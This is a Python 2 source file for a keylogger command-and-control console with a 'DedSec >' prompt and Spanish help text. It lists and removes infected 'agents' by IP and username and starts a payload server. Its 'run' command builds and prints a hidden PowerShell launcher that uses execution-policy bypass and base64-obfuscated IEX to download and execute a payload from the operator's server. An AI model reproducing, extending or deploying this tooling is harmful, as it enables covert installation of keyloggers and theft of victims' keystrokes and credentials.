import sys
import os
import time
import threading
import base64
import re
from Lib import web
from Lib import prettytable
from System import Banner
from System import Global
from System.Colors import bcolors
from System.Server import server

class Command:
	COMMANDS 	= ['exit','show','help','set','run','list','kill']
	HELPCOMMANDS	= [
		['exit','Salir de la consola'],
		['list','Listar agentes'],
		['kill','Matar agente'],
		['run','Correr script y server'],
		['help','Help'],
		['set','Cambiar el valor de una variable'],
		['show','Muestra las variable y sus valores']
	]

	def help(self,args=None):
		table 	 = prettytable.PrettyTable(['Comando','Descripcion'])
		table.border = False
		table.align  = 'l'
		table.add_row(['-'*7,'-'*11])
		for i in self.HELPCOMMANDS:
			table.add_row([i[0] ,i[1]])
		print table

	def exit(self,args=None):
		os._exit(0)

	def list(self,args=None):
		table 	 = prettytable.PrettyTable(['ID', 'IP', 'Username'])
		table.border = False
		table.align  = 'l'
		table.add_row(['-'*2,'-'*2,'-'*8])
		for i in Global.AGENTS:
			j = re.search('^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})*', i).group()
			table.add_row([ i ,j,i[len(j)+1:]])
		print table

	def kill(self,args):
		if(len(args) < 2):
			return None
		if(args[1] in Global.AGENTS):
			Global.AGENTS.remove(args[1])

	def run(self,args=None):
		flag = True
		for i in options:
			if(options[i][1] and options[i][0] == ''):
				print '[-]' + ' set ' + i
				flag = False
		if(flag):
			print '[+] Server corriendo en: ' + ("http://%s:%s/")%(options['host'][0],options['port'][0])
			threading.Thread(target=server, args=(options['port'][0],options['host'][0],)).start()
			time.sleep(1)
			command = "powershell -exec bypass -WindowStyle Hidden IEX(IEX(\"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('"+base64.b64encode('(New-Object Net.WebClient).DownloadString("http://%s:%s/get_payload")'%(options['host'][0],options['port'][0]))+"'))\"))"
			print '[+] Keylogger launcher esta: '+ '\n' +command
			

	def set(self,args):
		if(len(args) < 2):
			return None
		if(options.has_key(args[1])):
			options[args[1]][0] = args[2]

	def show(self,args=None):
		table 	 = prettytable.PrettyTable(['Nombre' , 'Configuracion asignada' , 'Requerida' , 'Descripcion' ])
		table.border = False
		table.align  = 'l'
		table.add_row(['-'*4,'-'*15,'-'*8,'-'*11])
		for i in options:
			table.add_row([ i ,options[i][0],options[i][1],options[i][2]])
				
		print table 

agents	= list()
options = {
	'port'		:['8080'	,True	,'Puerto'],
	'host'		:[''		,True	,'Tu direccion ip']
	}


def main():
	Banner.Banner()
	Command().help()
	while True:
		input	= raw_input('DedSec > ').strip().split()
		if(input):
			if(input[0] in Command.COMMANDS):
				result = getattr(globals()['Command'](),input[0])(input)	

main()


		
	
